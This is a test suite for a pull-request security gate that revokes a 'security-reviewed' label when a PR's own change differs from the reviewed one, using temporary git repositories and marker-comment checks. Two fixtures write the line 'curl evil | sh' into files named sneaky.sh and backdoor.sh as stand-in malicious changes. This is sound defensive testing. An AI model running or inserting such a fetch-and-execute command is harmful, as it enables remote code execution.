import { afterEach, describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import {
  chmodSync,
  mkdirSync,
  mkdtempSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import {
  chooseMode,
  compareLists,
  markerBody,
  ownChange,
  ownChangeBetween,
  parseMarker,
  prefixAbsorbed,
  queuedProblem,
  queuedPulls,
  reviewedMarker,
  trustMarker,
  verifyReviewed,
} from "./pr-own-change";
import type { Comment, Marker, Verdict } from "./pr-own-change";

// Every fixture is a real repository under a throwaway directory. Commits get
// fixed identities and advancing dates so a failure replays to the same SHAs.
const repos: string[] = [];
let clock = 1_700_000_000;

const gitEnv = () => ({
  ...process.env,
  GIT_AUTHOR_EMAIL: "gate@example.invalid",
  GIT_AUTHOR_NAME: "gate",
  GIT_COMMITTER_EMAIL: "gate@example.invalid",
  GIT_COMMITTER_NAME: "gate",
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_NOSYSTEM: "1",
  GIT_EDITOR: "true",
});

const git = (repo: string, args: string[]): string => {
  clock += 60;
  const stamp = `${clock} +0000`;

  return execFileSync("git", args, {
    cwd: repo,
    encoding: "utf-8",
    env: {
      ...gitEnv(),
      GIT_AUTHOR_DATE: stamp,
      GIT_COMMITTER_DATE: stamp,
    },
  }).replace(/\n$/u, "");
};

const newRepo = (): string => {
  const repo = mkdtempSync(path.join(tmpdir(), "pr-own-change-"));
  repos.push(repo);
  git(repo, ["init", "-q", "-b", "main"]);
  git(repo, ["config", "core.fileMode", "true"]);

  return repo;
};

// Write (or delete, with `null`) each file, then commit the tree. Returns the
// commit SHA: the fixtures carry heads around as values.
const commit = (
  repo: string,
  files: Record<string, string | Uint8Array | null>,
  message = "change"
): string => {
  for (const [file, content] of Object.entries(files)) {
    const target = path.join(repo, file);

    if (content === null) {
      rmSync(target);
      continue;
    }

    mkdirSync(path.dirname(target), { recursive: true });
    writeFileSync(target, content);
  }

  git(repo, ["add", "--all"]);
  git(repo, ["commit", "-q", "--allow-empty", "-m", message]);

  return head(repo);
};

// The same commit again on a new history: `--amend` is the fixture's stand-in
// for whatever a rebase did to the commit it replayed.
const amend = (repo: string, files: Record<string, string | Uint8Array>) => {
  for (const [file, content] of Object.entries(files)) {
    writeFileSync(path.join(repo, file), content);
  }

  git(repo, ["add", "--all"]);
  git(repo, ["commit", "-q", "--amend", "--no-edit"]);

  return head(repo);
};

const head = (repo: string): string => git(repo, ["rev-parse", "HEAD"]);

const checkout = (repo: string, ref: string) => {
  git(repo, ["switch", "-q", "-c", ref]);
};

const rebasedOnto = (repo: string, base: string): string => {
  git(repo, ["rebase", "-q", base]);

  return head(repo);
};

afterEach(() => {
  for (const repo of repos.splice(0)) {
    rmSync(repo, { force: true, recursive: true });
  }
});

// The production decision for a later event: the recorded marker, the change
// it stands for recomputed from the recorded head, and the current change.
const gate = (
  repo: string,
  marker: Marker,
  base: string,
  current: string
): Verdict =>
  verifyReviewed({
    absorbed: (prefix) => prefixAbsorbed(repo, base, prefix),
    current: ownChange(repo, base, current),
    marker,
    recorded: ownChangeBetween(repo, marker.fork, marker.head),
  });

const review = (repo: string, base: string, reviewedHead: string): Marker => {
  const marker = reviewedMarker(repo, base, reviewedHead);

  if (marker === null) {
    throw new Error("fixture: the reviewed head has no own change");
  }

  return marker;
};

const comment = (id: number, body: string, edited = false): Comment => ({
  body,
  created: "2026-11-13T10:00:00Z",
  id,
  login: "github-actions[bot]",
  updated: edited ? "2026-11-13T10:01:00Z" : "2026-11-13T10:00:00Z",
});

// main gets base.txt; the PR branch forks there and adds pr.txt; then main
// moves on with an unrelated commit and the PR rebases onto it.
const rebasedFixture = () => {
  const repo = newRepo();
  commit(repo, { "base.txt": "base\n" });
  checkout(repo, "pr");
  const reviewed = commit(repo, { "pr.txt": "v1\n" }, "pr: add pr.txt");
  git(repo, ["switch", "-q", "main"]);

  const base = commit(
    repo,
    { "other.txt": "unrelated\n" },
    "main: add other.txt"
  );

  git(repo, ["switch", "-q", "pr"]);

  return { base, repo, reviewed };
};

// A stacked PR: `lower` is the layer below, `upper` the PR. The lower layer
// squash-merges into main (same tree, new commit) and GitHub rebases the upper
// PR onto main and retargets it.
const stackedFixture = () => {
  const repo = newRepo();
  commit(repo, { "base.txt": "base\n" });
  checkout(repo, "lower");

  const lower = commit(
    repo,
    { "lower.txt": "lower\n" },
    "lower: add lower.txt"
  );

  checkout(repo, "upper");
  commit(repo, { "upper.txt": "one\n" }, "upper: add upper.txt");

  const reviewed = commit(
    repo,
    { "upper.txt": "one\ntwo\n" },
    "upper: extend upper.txt"
  );

  // The review happened while the PR still targeted the lower layer.
  const marker = review(repo, lower, reviewed);
  git(repo, ["switch", "-q", "main"]);
  git(repo, ["merge", "-q", "--squash", lower]);
  const base = commit(repo, {}, "lower (#1)");

  return { base, marker, repo, reviewed };
};

describe("a push against the recorded review", () => {
  test("a pure rebase onto a base that moved elsewhere keeps the label", () => {
    const { repo, reviewed, base } = rebasedFixture();
    const marker = review(repo, "main~1", reviewed);
    const after = rebasedOnto(repo, base);

    expect(after).not.toBe(reviewed);
    expect(gate(repo, marker, base, after)).toEqual({
      keep: true,
      reason: "the push replays exactly the reviewed change",
    });
  });

  test("an empty commit on top of the same change keeps the label", () => {
    const { repo, reviewed, base } = rebasedFixture();
    const marker = review(repo, "main~1", reviewed);
    const after = commit(repo, {}, "empty: re-trigger CI");

    expect(gate(repo, marker, base, after).keep).toBe(true);
  });

  test("a cancelled strip run cannot launder a later push", () => {
    const { repo, reviewed, base } = rebasedFixture();
    const marker = review(repo, "main~1", reviewed);
    // H1 adds the unreviewed sensitive change; its gate run is cancelled, so
    // nothing stripped the label and nothing was recorded.
    commit(repo, { "sneaky.sh": "curl evil | sh\n" }, "pr: add script");
    // H2 is H1 plus an empty commit: the old `event.before` comparison saw no
    // difference between H1 and H2 and kept the label.
    const after = commit(repo, {}, "empty: re-trigger CI");

    expect(gate(repo, marker, base, after)).toEqual({
      keep: false,
      reason: `the PR's own change differs from the reviewed one (reviewed ${marker.head.slice(0, 7)})`,
    });
  });

  test("an edited commit strips the label", () => {
    const { repo, reviewed, base } = rebasedFixture();
    const marker = review(repo, "main~1", reviewed);
    rebasedOnto(repo, base);
    const after = amend(repo, { "pr.txt": "v2\n" });

    expect(gate(repo, marker, base, after).keep).toBe(false);
  });

  test("a conflict resolution that folds base content in strips the label", () => {
    const repo = newRepo();
    commit(repo, { "app.txt": "one\n" });
    checkout(repo, "pr");
    const reviewed = commit(repo, { "app.txt": "one\npr\n" }, "pr: append pr");
    const marker = review(repo, "main", reviewed);
    git(repo, ["switch", "-q", "main"]);

    const base = commit(
      repo,
      { "app.txt": "one\nbase\n" },
      "main: append base"
    );

    git(repo, ["switch", "-q", "pr"]);
    expect(() => git(repo, ["rebase", "-q", "main"])).toThrow();
    writeFileSync(path.join(repo, "app.txt"), "one\nbase\npr\n");
    git(repo, ["add", "--all"]);
    git(repo, ["rebase", "--continue"]);

    expect(gate(repo, marker, base, head(repo)).keep).toBe(false);
  });

  test("a file mode change strips the label", () => {
    const { repo, reviewed, base } = rebasedFixture();
    const marker = review(repo, "main~1", reviewed);
    rebasedOnto(repo, base);
    chmodSync(path.join(repo, "pr.txt"), 0o755);
    const after = amend(repo, {});

    expect(gate(repo, marker, base, after).keep).toBe(false);
  });

  test("a binary file's new content strips the label", () => {
    const repo = newRepo();
    commit(repo, { "base.txt": "base\n" });
    checkout(repo, "pr");

    const reviewed = commit(
      repo,
      { "blob.bin": new Uint8Array([1, 2, 3]) },
      "pr: add blob"
    );

    const marker = review(repo, "main", reviewed);
    git(repo, ["switch", "-q", "main"]);

    const base = commit(
      repo,
      { "other.txt": "unrelated\n" },
      "main: add other.txt"
    );

    git(repo, ["switch", "-q", "pr"]);
    rebasedOnto(repo, base);
    const after = amend(repo, { "blob.bin": new Uint8Array([1, 2, 4]) });

    expect(gate(repo, marker, base, after).keep).toBe(false);
  });

  test("an added file strips the label", () => {
    const { repo, reviewed, base } = rebasedFixture();
    const marker = review(repo, "main~1", reviewed);
    rebasedOnto(repo, base);

    const after = commit(
      repo,
      { "extra.txt": "sneaked in\n" },
      "pr: add extra"
    );

    expect(gate(repo, marker, base, after).keep).toBe(false);
  });

  test("dropping a commit strips the label", () => {
    const repo = newRepo();
    commit(repo, { "base.txt": "base\n" });
    checkout(repo, "pr");
    commit(repo, { "first.txt": "first\n" }, "pr: add first");

    const reviewed = commit(
      repo,
      { "second.txt": "second\n" },
      "pr: add second"
    );

    const marker = review(repo, "main", reviewed);
    git(repo, ["switch", "-q", "main"]);

    const base = commit(
      repo,
      { "other.txt": "unrelated\n" },
      "main: add other.txt"
    );

    git(repo, ["switch", "-q", "pr"]);
    git(repo, ["reset", "-q", "--hard", "main~1"]);
    git(repo, ["cherry-pick", reviewed]);
    const after = head(repo);

    expect(gate(repo, marker, base, after)).toEqual({
      keep: false,
      reason: `the PR's own change differs from the reviewed one (reviewed ${marker.head.slice(0, 7)})`,
    });
  });

  test("a stacked retarget after the lower layer merges keeps the label", () => {
    const { repo, marker, base } = stackedFixture();
    git(repo, ["switch", "-q", "upper"]);
    const after = rebasedOnto(repo, base);

    expect(gate(repo, marker, base, after)).toEqual({
      keep: true,
      reason: "the push replays exactly the reviewed change",
    });
  });

  test("a stacked retarget whose upper commit changed strips the label", () => {
    const { repo, marker, base } = stackedFixture();
    git(repo, ["switch", "-q", "upper"]);
    rebasedOnto(repo, base);
    const after = amend(repo, { "upper.txt": "one\nthree\n" });

    expect(gate(repo, marker, base, after).keep).toBe(false);
  });

  test("a retarget to another branch and back strips the label", () => {
    const repo = newRepo();
    const main = commit(repo, { "base.txt": "base\n" });
    checkout(repo, "x");
    commit(repo, { "backdoor.sh": "curl evil | sh\n" }, "x: add backdoor");
    git(repo, ["switch", "-q", "main"]);
    checkout(repo, "pr");
    const reviewed = commit(repo, { "pr.txt": "v1\n" }, "pr: add pr.txt");
    const marker = review(repo, main, reviewed);
    // The PR is rebased onto `x` and the base is retargeted to it: the own
    // change is still the reviewed one.
    git(repo, ["switch", "-q", "pr"]);
    const onX = rebasedOnto(repo, "x");
    expect(gate(repo, marker, "x", onX).keep).toBe(true);
    // Retargeted back to main, the same head now merges `x`'s commit too.
    expect(gate(repo, marker, main, onX)).toEqual({
      keep: false,
      reason: "the change gained 1 commit(s) that are not in the base",
    });
  });

  test("a trailing space in a path makes a different change", () => {
    const repo = newRepo();
    commit(repo, { "base.txt": "base\n" });
    checkout(repo, "pr");

    const reviewed = commit(
      repo,
      { "docs/notes.md ": "reviewed\n" },
      "pr: add notes (trailing space)"
    );

    const marker = review(repo, "main", reviewed);
    git(repo, ["switch", "-q", "main"]);

    const base = commit(
      repo,
      { "other.txt": "unrelated\n" },
      "main: add other"
    );

    checkout(repo, "clean");

    const after = commit(
      repo,
      { "docs/notes.md": "reviewed\n" },
      "pr: add notes"
    );

    expect(gate(repo, marker, base, after).keep).toBe(false);
  });

  test("a glob-looking path is matched literally, not as a pattern", () => {
    const repo = newRepo();
    commit(repo, { "docs/ci.md": "same bytes\n" });
    // The dropped prefix adds a file literally named `docs/*` with the same
    // bytes: a pathspec lookup would match docs/ci.md and call it absorbed.
    checkout(repo, "lower");

    const lower = commit(
      repo,
      { "docs/*": "same bytes\n" },
      "lower: add docs/*"
    );

    checkout(repo, "upper");
    commit(repo, { "upper.txt": "one\n" }, "upper: add upper.txt");

    const reviewed = commit(
      repo,
      { "upper.txt": "one\ntwo\n" },
      "upper: extend"
    );

    const marker = review(repo, lower, reviewed);
    git(repo, ["switch", "-q", "main"]);
    git(repo, ["merge", "-q", "--squash", lower]);

    expect(prefixAbsorbed(repo, "main", [lower])).toBe(false);
    expect(gate(repo, marker, "main", reviewed)).toEqual({
      keep: false,
      reason: "the change gained 1 commit(s) that are not in the base",
    });
  });

  test("a merge commit in the PR's own range is unreadable", () => {
    const repo = newRepo();
    commit(repo, { "base.txt": "base\n" });
    checkout(repo, "pr");
    commit(repo, { "pr.txt": "v1\n" }, "pr: add pr.txt");
    git(repo, ["switch", "-q", "main"]);

    const base = commit(
      repo,
      { "other.txt": "unrelated\n" },
      "main: add other"
    );

    git(repo, ["switch", "-q", "pr"]);
    git(repo, ["merge", "-q", "--no-ff", "-m", "merge main", "main"]);

    expect(() => ownChange(repo, base, head(repo))).toThrow(
      "contains a merge commit"
    );
  });

  test("a shallow checkout refuses to compare instead of guessing", () => {
    const { repo } = rebasedFixture();
    const clone = mkdtempSync(path.join(tmpdir(), "pr-own-change-shallow-"));
    repos.push(clone);
    execFileSync(
      "git",
      ["clone", "-q", "--depth", "1", `file://${repo}`, clone],
      {
        env: gitEnv(),
        stdio: ["ignore", "pipe", "pipe"],
      }
    );

    expect(() => ownChange(clone, "HEAD", "HEAD")).toThrow("shallow");
  });
});

describe("trustMarker", () => {
  const marker = {
    base: "a".repeat(40),
    digest: "b".repeat(64),
    fork: "c".repeat(40),
    head: "d".repeat(40),
  };

  test("a marker from github-actions is trusted", () => {
    expect(trustMarker([comment(1, markerBody(marker))])).toEqual({
      marker,
      reason: `reviewed head ${marker.head.slice(0, 7)}`,
    });
  });

  test("the newest marker wins even when the listing is out of order", () => {
    const older = { ...marker, head: "e".repeat(40) };
    expect(
      trustMarker([
        comment(9, markerBody(marker)),
        comment(4, markerBody(older)),
      ]).marker
    ).toEqual(marker);
  });

  test("a marker from anything but the bot is ignored", () => {
    const forged = { ...comment(1, markerBody(marker)), login: "agent[bot]" };
    expect(trustMarker([forged]).marker).toBeNull();
  });

  test("an edited newest marker is never trusted", () => {
    expect(
      trustMarker([
        comment(1, markerBody(marker), true),
        comment(0, markerBody(marker)),
      ]).marker
    ).toBeNull();
  });

  test("an unreadable newest marker does not fall back to an older one", () => {
    expect(
      trustMarker([
        comment(1, markerBody(marker)),
        comment(2, "<!-- security-gate:reviewed {not json} -->"),
      ]).marker
    ).toBeNull();
    expect(
      trustMarker([
        comment(1, markerBody(marker)),
        comment(2, `${markerBody(marker)}`.replaceAll('"v":1', '"v":2')),
      ]).reason
    ).toContain("unreadable");
  });

  test("no marker at all is a strip", () => {
    expect(trustMarker([]).marker).toBeNull();
  });
});

describe("parseMarker", () => {
  const marker = {
    base: "a".repeat(40),
    digest: "b".repeat(64),
    fork: "c".repeat(40),
    head: "d".repeat(40),
  };

  test("round-trips through markerBody", () => {
    expect(parseMarker(markerBody(marker))).toEqual(marker);
  });

  test("rejects a short sha, a short digest and a missing field", () => {
    expect(
      parseMarker(markerBody({ ...marker, head: "d".repeat(7) }))
    ).toBeNull();
    expect(
      parseMarker(markerBody({ ...marker, digest: "b".repeat(12) }))
    ).toBeNull();
    expect(
      parseMarker(
        `<!-- security-gate:reviewed {"v":1,"head":"${marker.head}"} -->`
      )
    ).toBeNull();
  });

  test("rejects a body that is not a marker", () => {
    expect(parseMarker("just a comment")).toBeNull();
    expect(parseMarker("<!-- security-gate:reviewed {oops} -->")).toBeNull();
    expect(parseMarker("<!-- security-gate:reviewed ")).toBeNull();
  });
});

describe("chooseMode", () => {
  const marker = {
    base: "a".repeat(40),
    digest: "b".repeat(64),
    fork: "c".repeat(40),
    head: "d".repeat(40),
  };

  const other = { ...marker, head: "e".repeat(40) };

  test("only a human labelling establishes trust", () => {
    expect(
      chooseMode({
        action: "labeled",
        baseChanged: false,
        head: marker.head,
        marker: null,
      })
    ).toBe("record");
    expect(
      chooseMode({
        action: "labeled",
        baseChanged: false,
        head: marker.head,
        marker: other,
      })
    ).toBe("record");
    expect(
      chooseMode({
        action: "labeled",
        baseChanged: false,
        head: marker.head,
        marker,
      })
    ).toBe("none");
  });

  test("a push verifies, a body-only edit does nothing", () => {
    expect(
      chooseMode({
        action: "synchronize",
        baseChanged: false,
        head: other.head,
        marker,
      })
    ).toBe("verify");
    expect(
      chooseMode({
        action: "edited",
        baseChanged: false,
        head: marker.head,
        marker,
      })
    ).toBe("none");
    expect(
      chooseMode({
        action: "edited",
        baseChanged: true,
        head: marker.head,
        marker,
      })
    ).toBe("verify");
  });

  test("a reopen without a marker records; with one it verifies", () => {
    expect(
      chooseMode({
        action: "reopened",
        baseChanged: false,
        head: marker.head,
        marker: null,
      })
    ).toBe("record");
    expect(
      chooseMode({
        action: "reopened",
        baseChanged: false,
        head: marker.head,
        marker,
      })
    ).toBe("none");
    expect(
      chooseMode({
        action: "reopened",
        baseChanged: false,
        head: other.head,
        marker,
      })
    ).toBe("verify");
    expect(
      chooseMode({
        action: "ready_for_review",
        baseChanged: false,
        head: other.head,
        marker,
      })
    ).toBe("verify");
  });
});

describe("compareLists", () => {
  test("equal lists and a leading prefix are the only accepted shapes", () => {
    expect(compareLists(["a"], ["a"]).verdict).toBe("equal");
    expect(compareLists(["a"], ["x", "a"])).toEqual({
      prefix: 1,
      reason: "the change now starts with 1 commit(s) the base gained",
      verdict: "prefix",
    });
  });

  test("a dropped or reordered commit is a different change", () => {
    expect(compareLists(["a", "b"], ["b"]).verdict).toBe("different");
    expect(compareLists(["a", "b"], ["b", "a"]).verdict).toBe("different");
    expect(compareLists([], ["a"]).verdict).toBe("different");
    expect(compareLists(["a"], []).verdict).toBe("different");
  });
});

describe("the merge queue", () => {
  const marker = {
    base: "a".repeat(40),
    digest: "b".repeat(64),
    fork: "c".repeat(40),
    head: "d".repeat(40),
  };

  const queuedHead = marker.head;

  test("the payload list wins, the head ref is the fallback", () => {
    expect(
      queuedPulls(
        JSON.stringify([{ head: { sha: queuedHead }, number: 7 }]),
        `refs/heads/gh-readonly-queue/main/pr-1-${"f".repeat(40)}`
      )
    ).toEqual([{ head: queuedHead, number: 7 }]);
    expect(
      queuedPulls(
        "null",
        `refs/heads/gh-readonly-queue/main/pr-7-${queuedHead}`
      )
    ).toEqual([{ head: queuedHead, number: 7 }]);
    expect(queuedPulls("not json", "refs/heads/main")).toEqual([]);
  });

  test("a queued reviewed PR must still match its marker", () => {
    expect(
      queuedProblem({
        head: queuedHead,
        labels: ["security-sensitive", "security-reviewed"],
        marker,
        number: 7,
      })
    ).toBeNull();
  });

  test("a stripped label, a missing marker and a moved head all block", () => {
    expect(
      queuedProblem({
        head: queuedHead,
        labels: ["security-sensitive"],
        marker,
        number: 7,
      })
    ).toContain("no longer carries");
    expect(
      queuedProblem({
        head: queuedHead,
        labels: ["security-sensitive", "security-reviewed"],
        marker: null,
        number: 7,
      })
    ).toContain("no recorded reviewed change");
    expect(
      queuedProblem({
        head: "e".repeat(40),
        labels: ["security-sensitive", "security-reviewed"],
        marker,
        number: 7,
      })
    ).toContain("not the queued");
  });

  test("a PR the gate never marked sensitive passes", () => {
    expect(
      queuedProblem({
        head: "e".repeat(40),
        labels: [],
        marker: null,
        number: 7,
      })
    ).toBeNull();
    expect(
      queuedProblem({
        head: "e".repeat(40),
        labels: ["security-reviewed"],
        marker: null,
        number: 7,
      })
    ).toBeNull();
  });
});
